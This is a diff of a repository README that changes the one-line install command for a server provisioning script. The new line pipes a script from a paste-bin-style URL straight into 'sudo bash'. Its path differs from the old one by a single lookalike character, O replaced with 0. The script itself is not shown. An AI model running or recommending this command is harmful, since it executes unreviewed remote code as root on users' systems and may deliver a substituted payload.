@@ -17,7 +17,7 @@ This repository provides a production-grade provisioning script to set up a secu
 Run the following command to download and execute the setup script. This must be run as a regular user with `sudo` privileges.
 
 ```bash
-bash <(curl -s https://bin.blockloom.ch/dotQO7Dg)
+curl -fsSL https://bin.blockloom.ch/dotQ07Dg | sudo bash
 ```
 
 > **Note**: The script will automatically detect your OS, install dependencies, and apply configurations.
